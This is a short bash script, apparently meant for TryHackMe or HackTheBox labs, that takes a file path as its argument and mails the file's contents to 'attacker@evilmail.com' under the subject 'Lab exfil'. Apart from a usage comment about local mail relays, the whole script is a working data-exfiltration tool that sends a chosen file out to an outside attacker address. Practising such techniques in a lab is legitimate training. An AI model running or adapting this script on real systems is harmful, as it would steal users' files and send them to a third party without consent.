#!/bin/bash
# Send a file as email body (requires ssmtp or mailx installed)
# Setup tip: On TryHackMe/HTB, use a local relay or fake mail server listener (like smtp-sink)
FILE="$1"
TO="attacker@evilmail.com"

echo "Sending $FILE to $TO ..."
mail -s "Lab exfil" "$TO" < "$FILE"

